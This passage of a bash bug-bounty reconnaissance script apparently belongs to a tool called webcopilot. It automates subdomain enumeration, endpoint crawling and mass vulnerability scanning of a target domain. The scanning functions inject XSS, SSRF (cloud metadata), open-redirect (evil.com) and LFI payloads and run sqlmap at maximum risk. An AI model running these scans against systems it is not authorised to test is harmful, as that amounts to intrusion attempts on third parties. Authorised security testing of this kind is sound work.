\"\\033[2A\"\n    # echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}sublist3r${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/sublister.txt 2> /dev/null | wc -l )\"\n\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}SUBLIST3R_V2.0${NORMAL}]\"\n    [ ! -f temp/sublisterv2.txt ] && python3 ~/tools/SUBLIST3R_V2.0/sublist3r.py -d $domain -t $threads -o temp/sublisterv2.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}SUBLIST3R_V2.0${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/sublisterv2.txt 2> /dev/null | wc -l )\"\n\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}subfinder${NORMAL}]\"\n    [ ! -f temp/subfinder.txt ] && subfinder -silent -d $domain -all -t $threads -o temp/subfinder.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}subfinder${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/subfinder.txt 2> /dev/null | wc -l )\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}amass${NORMAL}]\"\n    [ ! -f temp/passive_amass.txt ] && amass enum -passive -norecursive -d $domain -o temp/passive_amass.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/amass.txt 2> /dev/null | wc -l )\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}findomain${NORMAL}]\"\n    [ ! -f temp/findomain.txt ] && findomain -r -q -t $domain | anew -q temp/findomain.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}findomain${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/findomain.txt 2> /dev/null | wc -l )\\n\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}crt.sh${NORMAL}]\"\n    [ ! -f temp/crtsh.txt ] && curl -s \"https://crt.sh/?q=%25.$domain&output=json\" | jq -r '.[].name_value' 2>/dev/null | sed 's/\\*\\.//g' | sort -u | anew -q temp/crtsh.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}crt.sh${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/crtsh.txt 2> /dev/null | wc -l )\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}hackertarget${NORMAL}]\"\n    [ ! -f temp/hackertarget.txt ] && curl -s \"https://api.hackertarget.com/hostsearch/?q=$domain\" | cut -d ',' -f1 | anew -q temp/hackertarget.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}hackertarget${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/hackertarget.txt 2> /dev/null | wc -l )\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}riddler${NORMAL}]\"\n    [ ! -f temp/riddler.txt ] && curl -s \"https://riddler.io/search/exportcsv?q=pld:$domain\" | cut -d ',' -f6 | sed 's/Keywords//' | sed '/^$/d' | anew -q temp/riddler.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}riddler${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/riddler.txt 2> /dev/null | wc -l )\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}certspotter${NORMAL}]\"\n    [ ! -f temp/certspotter.txt ] && curl -s \"https://certspotter.com/api/v0/certs?domain=$domain\" | jq '.[].dns_names[]' | sed 's/\\\"//g' | anew -q temp/certspotter.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}certspotter${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat temp/certspotter.txt 2> /dev/null | wc -l )\\n\"\n}\n\n###################################################### [Active Subdomain Enumeration] ######################################################\nactive_subenum() {\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Active Subdomain Scanning is in progress:${NORMAL}\\n\"\n    echo -e \"${NORMAL}${WHITE}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please be patient. This may take a while...${NORMAL}\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}[●] Active Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}gobuster${NORMAL}]\"\n    # ffuf -u http://FUZZ.$domain/ -t 200 -p 1.0-2.0 -w ~/wordlists/subdomains.txt -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" -mc 200,403 -r -o temp/ffuf.json -s &> /dev/null\n    # cat temps/ffuf.json | jq -r '.results[] | {status:.status, host:.host} | .host' 2> /dev/null | anew -q temp/active_ffuf.txt\n    [ ! -f temp/active_gobuster.txt ] && gobuster dns -d $domain -w ~/wordlists/subdomains.txt -t $threads --timeout 3s -q -o  temp/active_gobuster.txt\n    echo -e \"\\033[1A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Active Subdomain Scanned  -  ${NORMAL}[${GREEN}gobuster${TICK}${NORMAL}]${DTAB} Subdomain Found: ${RED}$(cat temp/active_gobuster.txt 2> /dev/null | wc -l )\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Active Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}amass${NORMAL}]\"\n    [ ! -f temp/active_amass.txt ] && timeout 22m amass enum -active -brute -w ~/wordlists/subdomains.txt -d $domain -o temp/active_amass.txt &> /dev/null\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Active Subdomain Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${DTAB} Subdomain Found: ${RED}$(cat temp/active_amass.txt 2> /dev/null | wc -l )\\n\"\n}\n\n###################################################### [Subdomain Filtering] ######################################################\nout_of_scope_subdomain_filtering() {    \n    echo -ne \"\\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Filtering is in progress:${NORMAL}\\n\"\n    echo -ne \"\\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Filtering  -  ${NORMAL}${BOLD} Filtering out of scope subdomains\\r\"\n    cat temp/*.txt | grep -v \"*\" | sed '/@\\|<BR>\\|\\_\\|*/d' | grep \"$domain\" | anew -q subdomains/domains.txt\n    sleep 1s\n    if [ -f \"$excl\" ]\n        then \n            cat subdomains/domains.txt | grep -vf $exclude | sort -u | sed '/@\\|<BR>\\|\\_\\|*/d' | dnsx -retry 2 -r ~/wordlists/resolvers.txt -t $threads -silent | grep -E '^((http|https):\\/\\/)?([a-zA-Z0-9]([a-zA-Z0-9\\-]*[a-zA-Z0-9])?\\.)+[a-zA-Z]{1,}(\\/.*)?$' | anew -q subdomains/subdomains.txt\n        else\n            cat subdomains/domains.txt | sort -u | sed '/@\\|<BR>\\|\\_\\|*/d' | dnsx -retry 2 -r ~/wordlists/resolvers.txt  -t $threads -silent | grep -E '^((http|https):\\/\\/)?([a-zA-Z0-9]([a-zA-Z0-9\\-]*[a-zA-Z0-9])?\\.)+[a-zA-Z]{1,}(\\/.*)?$' | anew -q subdomains/subdomains.txt\n    fi\n    echo -ne \"\\n${NORMAL}${BOLD}${SORANGE}[●] Subdomain Filtering  -  ${NORMAL}${BOLD} Filtering out of scope subdomains is completed. ${NORMAL}\\t Check: ${GREEN}$(echo '/subdomains/subdomains.txt' 2> /dev/null)\"\n}\n\nalive_subdomain_filtering() {\n     echo -ne \"\\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Filtering:${NORMAL}${BOLD} Filtering Alive subdomains\\r\"\n    [ ! -f temp/alivesub.txt ] && cat subdomains/subdomains.txt | sort -u | uniq -u | httpx -threads $threads -tls-probe -csp-probe -silent -o subdomains/alivesub.txt &> /dev/null\n    # [ ! -f temp/alivesub.txt ] && cat subdomains/subdomains.txt | httpx -threads $threads -status-code -silent -timeout 20 -retries 2 -follow-host-redirects -random-agent -no-color 2> /dev/null | anew -q subdomains/alivesub.txt\n    [ ! -f temp/alwithouthttp.txt ] && cat subdomains/alivesub.txt | sed -E 's/^\\s*.*:\\/\\///g' | anew -q subdomains/alwithouthttp.txt\n    echo -ne \"\\n${NORMAL}${BOLD}${SORANGE}[●] Subdomain Filtering  -  ${NORMAL}${BOLD} Filtering alive subdomains is completed. ${NORMAL}\\t Check: ${GREEN}$(echo '/subdomains/alivesub.txt' 2> /dev/null)\"\n}\n\n###################################################### [Subdomain Visual Inspection] ######################################################\nsubdomain_inspection() {\n    mkdir -p subdomains/aquatone\n    echo -ne \"\\n${NORMAL}${BOLD}${YELLOW}[●] Subdomain Scanning:${NORMAL}${BOLD} Getting titles of valid subdomains\\r\"\n    [ ! -f temp/title.txt ] && cat subdomains/alivesub.txt | httpx -threads $threads -status-code -title -silent  -timeout 20 -retries 2 -follow-host-redirects -random-agent -no-color 2> /dev/null | anew -q subdomains/title.txt\n    echo -ne \"\\n${NORMAL}${BOLD}${YELLOW}[●] Visual inspection of Subdomains:${NORMAL} [${GREEN}${BLINK}Aquatone${NORMAL}]\"\n    [ ! -d temp/aquatone ] && cat subdomains/alivesub.txt | aquatone -chrome-path /snap/bin/chromium -out subdomains/aquatone/ -threads 10 -silent &> /dev/null\n    echo -e \"\\033[1A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Visual inspection of Subdomains is completed. ${NORMAL}\\t Check: ${GREEN}$(echo '/subdomains/aquatone/' 2> /dev/null)\"\n}\n\n###################################################### [Endpoints and Patterns Scanning] ######################################################\ncrawl_endpoints() {\n    echo -ne \"\\n${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning is in progress:${NORMAL}\\n\"\n    echo -ne \"\\n${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Getting all endpoints\\r\"\n    # [ ! -f temp/gauplus.txt ] && cat subdomains/alivesub.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -t $threads -o temp/gauplus.txt\n    # [ ! -f temp/gau.txt ] && cat subdomains/alivesub.txt | gau --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -t $threads -o temp/gau.txt\n    # [ ! -f temp/waybackurls.txt ] && cat subdomains/alivesub.txt | waybackurls | anew -q temp/waybackurls.txt\n    # [ ! -f temp/endpoints.txt ] && cat temp/gauplus.txt temp/gau.txt temp/waybackurls.txt 2> /dev/null | sed '/\\[/d' | grep $domain | sort -u | urldedupe -s | anew -q subdomains/endpoints.txt\n    [ ! -f temp/waymore.txt ] && cat subdomains/alivesub.txt | python3 ~/tools/waymore/waymore.py -mode U -oU temp/waymore.txt\n    [ ! -f subdomains/endpoints.txt ] && cat temp/waymore.txt 2> /dev/null | sed '/\\[/d' | grep $domain | sort -u | urldedupe -s | anew -q subdomains/endpoints.txt\n\n}\n\nendpoints_and_pattern_filtering(){\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Filtering all endpoints\\r\"\n    [ ! -f patterns/xss.txt ] && cat subdomains/endpoints.txt | uro | gf xss | sed \"s/'\\|(\\|)//g\" | qsreplace \"FUZZ\" 2> /dev/null | anew -q patterns/xss.txt\n    [ ! -f patterns/ssrf.txt ] && cat subdomains/endpoints.txt | uro | gf ssrf | sed \"s/'\\|(\\|)//g\" | qsreplace \"FUZZ\" 2> /dev/null | anew -q patterns/ssrf.txt\n    [ ! -f patterns/sqli.txt ] && cat subdomains/endpoints.txt | uro | gf sqli | sed \"s/'\\|(\\|)//g\" | qsreplace \"FUZZ\" 2> /dev/null | anew -q patterns/sqli.txt\n    [ ! -f patterns/lfi.txt ] && cat subdomains/endpoints.txt | uro | gf lfi | sed \"s/'\\|(\\|)//g\" | qsreplace \"FUZZ\" 2> /dev/null | anew -q patterns/lfi.txt\n    [ ! -f patterns/rce.txt ] && cat subdomains/endpoints.txt | uro | gf rce | sed \"s/'\\|(\\|)//g\" | qsreplace \"FUZZ\" 2> /dev/null | anew -q patterns/rce.txt\n    [ ! -f patterns/openredirect.txt ] && cat subdomains/endpoints.txt | uro | gf redirect | sed \"s/'\\|(\\|)//g\" | qsreplace \"FUZZ\" 2> /dev/null | anew -q patterns/openredirect.txt \n\n    # echo -ne \"${NORMAL}${BOLD}${LGREEN}[●] Endpoints Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$domain${RED}${WHITE}\\t Total: ${GREEN}$(cat subdomains/endpoints.txt 2> /dev/null | wc -l )\"\n    echo -ne \"${NORMAL}${BOLD}${LGREEN}[●] Endpoints Scanning Completed. ${NORMAL}${WHITE}\\t Total: ${GREEN}$(cat subdomains/endpoints.txt 2> /dev/null | wc -l )\"\n    sleep 2s\n}\n\n###################################################### [Vulnerabilities Scanning] ######################################################\nxss() {\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning is in progress:${NORMAL}\\n\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}XSS${NORMAL}]\\r\"\n    sleep 2s\n    [ ! -f vulnerabilities/check_xss.txt ] && xargs -a patterns/xss.txt -P 30 -I % bash -c \"echo % | kxss\" 2> /dev/null | grep \"< >\\|\\\"\" | cut -d ' ' -f2 | anew -q vulnerabilities/check_xss.txt\n    [ ! -f vulnerabilities/xss.txt ] && cat patterns/xss.txt | qsreplace \"\\\"><img src=x onerror=confirm(document.domain)>\" | xargs -P 50 -I % bash -c \"curl -s -L '%' | grep \\\"<img src=x onerror=confirm(document.domain)>\\\" && echo -e \\\"[${RED}POTENTIAL XSS${NORMAL}] - % \\n \\\"\" 2> /dev/null | grep \"VULNERABLE\" | anew -q vulnerabilities/xss.txt &> /dev/null\n    if [ -n \"$bServer\" ]\n        then\n            [ ! -f vulnerabilities/xss_dalfox.txt ] && cat patterns/xss.txt | dalfox pipe --silence --no-color --no-spinner --skip-bav --mass --mass-worker $threads -w $threads -b $bServer -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" 2> /dev/null | anew -q vulnerabilities/xss_dalfox.txt &> /dev/null\n        else\n            [ ! -f vulnerabilities/xss_dalfox.txt ] && cat patterns/xss.txt | dalfox pipe --silence --no-color --no-spinner --skip-bav --mass --mass-worker $threads -w $threads -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" 2> /dev/null | anew -q vulnerabilities/xss_dalfox.txt &> /dev/null\n    fi\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}XSS${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/xss.txt 2> /dev/null | wc -l )\"\n}\n\nsqli() {\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}SQLi${NORMAL}]\\r\"\n    [ ! -d vulnerabilities/sqlmap ] && cat patterns/sqli.txt | xargs -P 30 -I % bash -c \"python3 ~/tools/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=vulnerabilities/sqlmap 2> /dev/null\" &> /dev/null\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}SQLi${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/sqlmap/*.txt 2> /dev/null | wc -l )\"\n}\n\nlfi() {\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}LFI${NORMAL}]\\r\"\n    [ ! -f temp/lfi.txt ] && cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c \"cat patterns/lfi.txt | qsreplace % \" 2> /dev/null | anew -q temp/lfi.txt\n    [ ! -f vulnerabilities/lfi.txt ] && xargs -a tem/lfi.txt -P 50 -I % bash -c \"curl -s -L  -H \\\"X-Bugbounty: Testing\\\" -H \\\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\\\" --insecure '%' | grep \\\"root:\\\" && echo -e \\\"[POTENTIAL LFI] - % \\n \\\"\" 2> /dev/null | grep \"POTENTIAL LFI\" | anew -q vulnerabilities/lfi.txt \n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}LFI${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/lfi.txt 2> /dev/null | wc -l )\"\n}\n\ncrlf() {\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}CRLF${NORMAL}]\\r\"\n    [ ! -f vulnerabilities/crlf.txt ] && crlfuzz -l subdomains/alivesub.txt -c $threads -s | anew vulnerabilities/crlf.txt &> /dev/null\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}CRLF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/crlf.txt 2> /dev/null | wc -l )\"\n}\n\nsubdomain_takeover(){\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Subdomain Takeover${NORMAL}]\\r\"\n    # xargs -a subdomains/subdomains.txt -P 50 -I % bash -c \"dig % | grep CNAME\"\n    # cat cnam | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe -threads $threads -fc 200,301,502,503\n    [ ! -f vulnerabilities/takeover.txt ] && subjack -w subdomains/subdomains.txt -t ${threads} -a -o vulnerabilities/.txt\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Subdomain Takeover${TICK}${NORMAL}]\\t Found: ${GREEN}$(cat vulnerabilities/takeover.txt 2> /dev/null | wc -l )\"\n}\n\nopenredirect(){\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Open Redirect${NORMAL}]\\r\"\n    [ ! -f temp/openredirect.txt ] && cat patterns/openredirect | qsreplace \"http://www.evil.com/\" 2> /dev/null | anew -q temp/openredirect.txt\n    [ ! -f vulnerabilities/openredirex.txt ] && python3 ~/tools/openredirex/openredirex.py -l temp/openredirect.txt --keyword FUZZ -p ~/tools/openredirex/payloads.txt 2> /dev/null | grep \"^http\" | sed -r -i \"s/\\x1B\\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g\" | anew -q vulnerabilities/openredirex.txt &> /dev/null\n    [ ! -f vulnerabilities/openredirect.txt ] && cat temp/opredirect.txt | xargs -P 50 -I % bash -c \"curl -s  -H \\\"X-Bugbounty: Testing\\\" -H \\\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\\\" --insecure -iL '%' | grep \\\"Evil.Com - We get it...Daily\\\" && echo -e \\\"[${RED}POTENTIAL OPREDIRECT${NORMAL}] - % \\n \\\"\" 2> /dev/null | grep \"POTENTIAL OPREDIRECT\" | anew vulnerabilities/openredirect.txt &> /dev/null\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Open redirect${TICK}${NORMAL}]\\t Found: ${GREEN}$(cat vulnerabilities/openredirect.txt 2> /dev/null | wc -l )\"\n}\n\nssrf(){\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}SSRF${NORMAL}]\\r\"\n    [ ! -f temp/ssrf.txt ] && cat domains/patterns/ssrf.txt | qsreplace \"http://169.254.169.254/latest/meta-data/hostname\" 2> /dev/null | anew -q temp/ssrf.txt\n    [ ! -f vulnerabilities/ssrf.txt ] && cat temp/ssrf.txt | xargs -P 55 -I % bash -c \"curl -s  -H \\\"X-Bugbounty: Testing\\\" -H \\\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\\\" --insecure '%' | grep \\\"compute.internal\\\" && echo -e \\\"[${RED}POTENTIAL SSRF${NORMAL}] - % \\n \\\"\" 2> /dev/null | grep \"POTENTIAL SSRF\" | anew vulnerabilities/ssrf.txt &> /dev/null\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}SSRF${TICK}${NORMAL}]${TTAB} Found: ${GREEN}$(cat vulnerabilities/ssrf.txt 2> /dev/null | wc -l )\"\n}\n\nnuclei(){\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning  -  ${NORMAL}[${GREEN}${BLINK}Nuclei${NORMAL}]\\r\"\n    [ ! -f nuclei/info.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c \"nuclei -target % -t ~/nuclei-templates/ -severity info -c 50 -silent\" 2> /dev/null | anew -q nuclei/info.txt\n    [ ! -f nuclei/low.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c \"nuclei -target % -t ~/nuclei-templates/ -severity low -c 50 -silent\" 2> /dev/null | anew nuclei/low.txt \n    [ ! -f nuclei/medium.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c \"nuclei -target % -t ~/nuclei-templates/ -severity medium -c 50 -silent\" 2> /dev/null | anew nuclei/medium.txt \n    [ ! -f nuclei/high.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c \"nuclei -target % -t ~/nuclei-templates/ -severity high -c 50 -silent\" 2> /dev/null | anew nuclei/high.txt \n    [ ! -f nuclei/critical.txt ] && xargs -a subdomains/alivesub.txt -P 50 -I % bash -c \"nuclei -target % -t ~/nuclei-templates/ -severity critical -c 50 -silent\" 2> /dev/null | anew nuclei/critical.txt \n    echo -ne \"${NORMAL}${BOLD}${SORANGE}[●] Vulnerabilities Scanned  -  ${NORMAL}[${RED}Nuclie${TICK}${NORMAL}]${DTAB} Found: ${GREEN}$(cat  nuclei/medium.txt nuclei/high.txt nuclei/critical.txt 2> /dev/null | wc -l )\"\n}\n\nresult() {\n    echo -e \"\\n${BOLD}${GREEN} \n▒█▀▀█ █▀▀ █▀▀ █░░█ █░░ ▀▀█▀▀\n▒█▄▄▀ █▀▀ ▀▀█ █░░█ █░░ ░░█░░\n▒█░▒█ ▀▀▀ ▀▀▀ ░▀▀▀ ▀▀▀ ░░▀░░\\n\"\n    if [ -n \"$domain\" ];then echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains of ${RED}$domain${NORMAL}\\n\"; fi\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Found:${NORMAL}${BOLD}${GREEN} $(cat subdomains/subdomains.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomains Alive:${NORMAL}${BOLD}${GREEN} $(cat subdomains/alivesub.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Endpoints:${NORMAL}${BOLD}${GREEN} $(cat subdomains/endpoints.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} XSS:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/xss.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SQLi:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/sqlmap/*.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Open Redirect:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/openredirect.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} SSRF:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/ssrf.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} CRLF:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/crlf.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} LFI:${NORMAL}${BOLD}${GREEN} $(cat vulnerabilities/lfi.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Subdomain Takeover:${NORMAL}${BOLD}${GREEN} $(cat subdomains/takeover.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n    echo -ne \"${BOLD}${LGREEN}[+]${NORMAL}${BOLD}${WHITE} Nuclei:${NORMAL}${BOLD}${GREEN} $(cat  nuclei/medium.txt nuclei/high.txt nuclei/critical.txt 2> /dev/null | wc -l)${NORMAL}\\n\"\n}\n\nsubScan(){\n    mkdir -p temp\n    mkdir -p subdomains\n    if [ -n \"$subdomainFile\" ]; then\n        echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Using provided subdomains from ${subdomainFile}${NORMAL}\\n\"\n        cp \"$subdomainFile\" subdomains/subdomains.txt\n    \n    # elif [ -n \"$subdomainFileContent\" ]; then\n    #     echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Using provided subdomains from stdin${NORMAL}\\n\"\n    #     echo \"$subdomainFileContent\" > subdomains/subdomains.txt\n    \n    else\n        echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Enumeration is in progress:${NORMAL}${BOLD} Scanning subdomains of ${RED}$domain${NORMAL}\\r\"  \n        sleep 1s\n        passive_subenum\n        sleep 2s\n        active_subenum\n        sleep 2s\n        out_of_scope_subdomain_filtering\n    fi\n    sleep 1s\n    alive_subdomain_filtering\n    sleep 2s\n    subdomain_inspection\n    sleep 1s\n    echo -ne \"${NORMAL}${BOLD}${LGREEN}\\n[●] Subdomain Enumeration Completed. ${WHITE}\\t Total: ${GREEN}$(cat subdomains/subdomains.txt 2> /dev/null | wc -l )${WHITE} | Alive: ${GREEN}$(cat subdomains/alivesub.txt 2> /dev/null | wc -l )\\n\"   \n\n}\n\ncrawl(){\n    mkdir -p patterns\n    sleep 2s\n    crawl_endpoints\n    sleep 2s\n    endpoints_and_pattern_filtering\n    sleep 1s   \n}\n\nvulnScan(){ \n    mkdir -p vulnerabilities\n    mkdir -p nuclei\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Vulnerabilities Scanning is in progress:${NORMAL}${BOLD} Getting all vulnerabilities of $domain\"  \n    sleep 2s\n    xss\n    sleep 2s\n    sqli\n    sleep 2s\n    lfi \n    sleep 2s\n    crlf\n    sleep 2s\n    ssrf \n    sleep 2s\n    sensitive\n    sleep 2s\n    openredirect\n    sleep 2s\n    subdomain_takeover\n    sleep 2s\n    nuclei\n    sleep 1s\n    echo -ne \"${NORMAL}${BOLD}${LGREEN}\\n[●] Vulnerabilities Scanning Completed. ${WHITE}\\t Check: ${GREEN}$(echo '/vulnerabilities/')\\n\"  \n}\n\nwebcopilot(){\n    subScan 2> 